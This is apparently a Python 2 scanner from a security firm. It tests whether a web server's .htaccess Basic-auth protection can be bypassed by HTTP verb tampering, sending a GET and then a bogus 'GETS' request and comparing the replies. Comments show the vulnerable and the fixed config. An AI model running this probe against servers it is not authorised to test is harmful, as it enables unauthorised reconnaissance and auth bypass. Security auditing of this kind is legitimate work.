#	.htaccess Bypass Scanner
# This module checks if a webiste is vulnerable to .htaccess bypass
#
# Vulnerable .htaccess File 
#	AuthName "Vulnerable .htaccess File "
#	AuthType Basic
#	AuthUserFile C:/xampp/apache/bin/.htpasswd
#	<Limit GET POST>
#	require valid-user
#	</Limit>
# FIX for vulnerability .htaccess File
#	AuthName "FIXED MISCONFIGURATION"
#	AuthType Basic
#	AuthUserFile C:/xampp/apache/bin/.htpasswd
#	require valid-user



import socket
import sys
import os

banner = ""
banner += "  ___        __        ____                 _    _  \n"   
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print banner
host = raw_input("Host >> ")
path = raw_input("Path >> ")
CRLF = "\r\n"
try:
	s.connect((host,80))
	print '\n\n[+] Connected To Host [+]\n'
	evilREQ = 'GET ' + path + ' HTTP/1.1' + CRLF + 'Host: ' + host + CRLF + 'User-Agent: Infogen-AL' + CRLF + CRLF + CRLF
	print '[+] Sending first request [+]\n'
	s.send(evilREQ)
	
	print '[+] First Request send [+]\n'
	a = s.recv(13)
	d = a.find("401")
	vuln = a
	if(d == -1):
		print '[-] Path does not have .htaccess protection [-]\n'
		exit(1)
	else:
		
		print '[+] Got response from server [+]\n'
		
	s.close()
	print '[+] Sending second request [+]\n'
	s1.connect((host,80))
	evilREQ1 = 'GETS ' + path + ' HTTP/1.1' + CRLF + 'Host: ' + host + CRLF + 'User-Agent: Infogen-AL' + CRLF + CRLF + CRLF
	s1.send(evilREQ1)
	print '[+] Second request sent [+]\n'
	dl = s1.recv(13)
	s1.close()
	if(dl == vuln):
		print '\n[+] Server in not vulnerable [+]\n'
	else:
		print '\n[+] Server Is VULNERABLE ...[+]\n'
	print '\n Advanced web site and server auditing and hardening ...\n Contact Us http://infogen.al/'
except Exception:
	print 'Error....'

